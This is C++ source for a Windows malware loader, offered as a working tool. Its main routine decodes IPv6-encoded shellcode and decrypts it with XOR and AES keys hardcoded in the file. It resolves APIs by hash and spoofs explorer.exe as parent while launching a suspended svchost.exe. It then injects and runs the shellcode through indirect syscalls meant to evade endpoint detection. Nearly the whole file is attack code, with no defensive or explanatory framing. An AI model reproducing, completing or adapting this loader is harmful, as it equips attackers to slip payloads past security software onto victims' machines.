#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#include "aes.h"
#include "aes.c"
#include "headstructs.h"
#include "payload.h"
#include "ntdll.h"
#include <tlhelp32.h>
#include <string>

#pragma comment(lib, "Ntdll.lib")

#define FNV_PRIME 0x1000193
#define FNV_OFFSET_BASIS 0x811c9dc5


DWORD fnv1a_hash(const char* functionName) {
    DWORD hash = FNV_OFFSET_BASIS;
    while (*functionName) {
        hash ^= (BYTE)(*functionName++);
        hash *= FNV_PRIME;
    }
    return hash;
}

void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {
    PCSTR Terminator = NULL;
    PVOID LpBaseAddress2 = NULL;
    LONG status;
    int i = 0;
    for (int j = 0; j < ElementsNumber; j++) {
        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
        status = RtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, (in6_addr*)LpBaseAddress2);
        if (status < 0) {
            return FALSE;
        }
        else {
            i = i + 16;
        }
    }
    return TRUE;
}

HMODULE GetModuleHandleReplacement(IN DWORD szModuleName) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

    while (pListEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (pDte->FullDllName.Length != 0) {
            int size_needed = WideCharToMultiByte(CP_ACP, 0, pDte->FullDllName.Buffer,
                pDte->FullDllName.Length / sizeof(WCHAR), NULL, 0, NULL, NULL);
            char* moduleName = new char[size_needed + 1];
            WideCharToMultiByte(CP_ACP, 0, pDte->FullDllName.Buffer,
                pDte->FullDllName.Length / sizeof(WCHAR), moduleName, size_needed, NULL, NULL);
            moduleName[size_needed] = '\0';

            for (int i = 0; moduleName[i]; ++i) {
                moduleName[i] = tolower(moduleName[i]);
            }

            char* baseName = strrchr(moduleName, '\\');
            if (baseName) baseName++;
            else baseName = moduleName;

            if (fnv1a_hash(baseName) == szModuleName) {
                delete[] moduleName;
                return (HMODULE)pDte->DllBase;
            }

            delete[] moduleName;
        }

        pListEntry = pListEntry->Flink;
    }

    return NULL;
}

PCHAR GetNtApiByHash(HMODULE hModule, DWORD functionHash) {
    if (!hModule) {
        printf("[!] Invalid module handle\n");
        return nullptr;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS header\n");
        return nullptr;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT header\n");
        return nullptr;
    }

    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) {
        return nullptr;
    }

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)hModule + addressOfNames[i]);
        if (fnv1a_hash(functionName) == functionHash) {
            return (PCHAR)functionName;
        }
    }

    return nullptr;
}

FARPROC GetAddrNT(HMODULE hModule, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)hModule + addressOfNames[i]);
        if (fnv1a_hash(functionName) == functionHash) {
            WORD functionOrdinal = addressOfNameOrdinals[i];
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[functionOrdinal]);
        }
    }
    return nullptr;
}

typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processInfo = { 0 };
    processInfo.dwSize = sizeof(PROCESSENTRY32W);

    HMODULE hKer = GetModuleHandleReplacement(0xa3e6f6c3); // Hash for kernel32.dll
    if (!hKer) {
        printf("[!] Failed to get kernel32.dll handle\n");
        return 0;
    }
    printf("[DEBUG] Got kernel32.dll handle: 0x%0-16p\n", hKer);

    pCreateToolhelp32Snapshot mySnapshot = (pCreateToolhelp32Snapshot)GetAddrNT(hKer, 0x185776b5); // CreateToolhelp32Snapshot
    pProcess32FirstW myP32First = (pProcess32FirstW)GetAddrNT(hKer, 0x0e81b808); // Process32FirstW
    pProcess32NextW myP32Next = (pProcess32NextW)GetAddrNT(hKer, 0xabe5123f); // Process32NextW

    if (!mySnapshot || !myP32First || !myP32Next) {
        printf("[!] Failed to get function pointers: Snapshot=%p, First=%p, Next=%p\n",
            mySnapshot, myP32First, myP32Next);
        return 0;
    }
    printf("[DEBUG] Got function pointers\n");

    HANDLE snapshot = mySnapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed with error: %u\n", GetLastError());
        return 0;
    }
    printf("[DEBUG] Created process snapshot\n");

    if (!myP32First(snapshot, &processInfo)) {
        printf("[!] Process32FirstW failed with error: %u\n", GetLastError());
        CloseHandle(snapshot);
        return 0;
    }

    if (_wcsicmp(processName.c_str(), processInfo.szExeFile) == 0) {
        DWORD pid = processInfo.th32ProcessID;
        printf("[DEBUG] Found %ws with PID: %u\n", processName.c_str(), pid);
        CloseHandle(snapshot);
        return pid;
    }

    while (myP32Next(snapshot, &processInfo)) {
        if (_wcsicmp(processName.c_str(), processInfo.szExeFile) == 0) {
            DWORD pid = processInfo.th32ProcessID;
            printf("[DEBUG] Found %ws with PID: %u\n", processName.c_str(), pid);
            CloseHandle(snapshot);
            return pid;
        }
    }

    printf("[!] Process %ws not found\n", processName.c_str());
    CloseHandle(snapshot);
    return 0;
}

extern "C" DWORD wNtCreateUserProcess = NULL;
extern "C" UINT_PTR sysAddrNtCreateUserProcess = NULL;

int main() {
    unsigned char xorKey[] = { 0x5d, 0xff, 0x1b, 0xf9, 0x48, 0xf4, 0xcc, 0x4c, 0x5d, 0x77, 0xa7, 0xbd, 0x6f, 0xd7 };
    unsigned char aesKey[] = { 0x1f, 0xde, 0x8b, 0xb1, 0xec, 0xa6, 0xe5, 0xd8, 0x1f, 0x56, 0x37, 0xf5, 0xcb, 0x85, 0x53, 0xe6, 0x6c, 0x8f, 0xb5, 0x86, 0x79, 0xda, 0xb6, 0x19, 0x3d, 0x5e, 0x03, 0xea, 0xe2, 0x64, 0x4e, 0x32 };
    unsigned char aesIv[] = { 0x77, 0x7d, 0xa8, 0x9e, 0xca, 0xcb, 0x29, 0x1b, 0x94, 0xe9, 0x9d, 0x9a, 0xc1, 0xa4, 0xe7, 0x86 };

    HMODULE hNtdll = GetModuleHandleReplacement(0xa62a3b3b); // ntdll.dll
    if (!hNtdll) {
        printf("[!] Failed to get ntdll handle\n");
        return -1;
    }

    LPVOID spoofJump = ((char*)GetAddrNT(hNtdll, 0x93834466)) + 18;
    DWORD SyscallId = 0;

    // Allocate memory for payload
    PVOID tempBuffer = NULL;
    SIZE_T szWmResv = SizeOfShellcode;
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xca67b978)); // NtAllocateVirtualMemory
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner((HANDLE)-1, &tempBuffer, NULL, &szWmResv, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtualMemory failed with status: 0x%X\n", status);
        return -1;
    }

    // Decode and decrypt payload
    if (!DecodeIPv6Fuscation(IPv6Shell, tempBuffer)) {
        printf("[!] DecodeIPv6Fuscation failed\n");
        return -1;
    }

    xorDecrypt((PBYTE)tempBuffer, SizeOfShellcode, xorKey, sizeof(xorKey));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIv);
    AES_CBC_decrypt_buffer(&ctx, (PBYTE)tempBuffer, SizeOfShellcode);

    // Find parent process ID (explorer.exe)
    DWORD parentPid = FindProcessId(L"explorer.exe");
    if (parentPid == 0) {
        printf("[!] Failed to find explorer.exe PID\n");
        return -1;
    }
    printf("[*] Parent PID (explorer.exe): %lu\n", parentPid);

    // Open parent process
    HANDLE hParent = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)parentPid, NULL };
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0x5ea49a38)); // NtOpenProcess
    setup(SyscallId, spoofJump);
    status = executioner(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtOpenProcess failed with status: 0x%X\n", status);
        return -1;
    }

    // Initialize process parameters for NtCreateUserProcess
    UNICODE_STRING NtImagePath;
    RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\svchost.exe");

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    status = RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
    if (!NT_SUCCESS(status)) {
        printf("[!] RtlCreateProcessParametersEx failed with status: 0x%X\n", status);
        CloseHandle(hParent);
        return -1;
    }

    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    // Set CREATE_SUSPENDED flag (bit 0)
    CreateInfo.InitState.u1.InitFlags = 0x00000001;

    PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if (!AttributeList) {
        printf("[!] Failed to allocate AttributeList\n");
        RtlDestroyProcessParameters(ProcessParameters);
        CloseHandle(hParent);
        return -1;
    }
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].Value = (ULONG_PTR)hParent;

    // Create new process (svchost.exe) using NtCreateUserProcess
    PROCESS_INFORMATION pi = { 0 };
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0x116893e9)); // NtCreateUserProcess
    setup(SyscallId, spoofJump);
    status = executioner(&pi.hProcess, &pi.hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtCreateUserProcess failed with status: 0x%X\n", status);
        RtlDestroyProcessParameters(ProcessParameters);
        RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
        CloseHandle(hParent);
        return -1;
    }

    // Clean up process parameters
    RtlDestroyProcessParameters(ProcessParameters);
    RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);

    // Allocate memory in new process
    PVOID remoteMem = NULL;
    SIZE_T regionSize = SizeOfShellcode;
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xca67b978)); // NtAllocateVirtualMemory
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess, &remoteMem, NULL, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtualMemory (remote) failed with status: 0x%X\n", status);
        CloseHandle(hParent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Write payload to remote process
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0x43e32f32)); // NtWriteVirtualMemory
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess, remoteMem, tempBuffer, SizeOfShellcode, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory failed with status: 0x%X\n", status);
        CloseHandle(hParent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Change memory protection
    ULONG oldProt;
    regionSize = SizeOfShellcode;
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xbd799926)); // NtProtectVirtualMemory
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess, &remoteMem, &regionSize, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtProtectVirtualMemory failed with status: 0x%X\n", status);
        CloseHandle(hParent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Create remote thread
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xb10f026c)); // NtCreateThreadEx
    setup(SyscallId, spoofJump);
    status = executioner(pi.hThread, remoteMem, NULL, NULL, 0);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtCreateThreadEx failed with status: 0x%X\n", status);
        CloseHandle(hParent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Wait for thread to complete
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xe06437fc)); // NtWaitForSingleObject
    setup(SyscallId, spoofJump);
    status = executioner(pi.hThread, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtWaitForSingleObject failed with status: 0x%X\n", status);
    }

    // Free local memory
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xb51cc567)); // NtFreeVirtualMemory
    setup(SyscallId, spoofJump);
    status = executioner((HANDLE)-1, &tempBuffer, &szWmResv, MEM_RELEASE);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtFreeVirtualMemory failed with status: 0x%X\n", status);
    }

    // Clean up handles
    GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0x6b372c05)); // NtClose
    setup(SyscallId, spoofJump);
    status = executioner(hParent);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtClose (hParent) failed with status: 0x%X\n", status);
    }
    status = executioner(pi.hProcess);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtClose (pi.hProcess) failed with status: 0x%X\n", status);
    }
    status = executioner(pi.hThread);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtClose (pi.hThread) failed with status: 0x%X\n", status);
    }

    printf("Success! Hit Enter to exit...\n");
    getchar();
    return 0;
}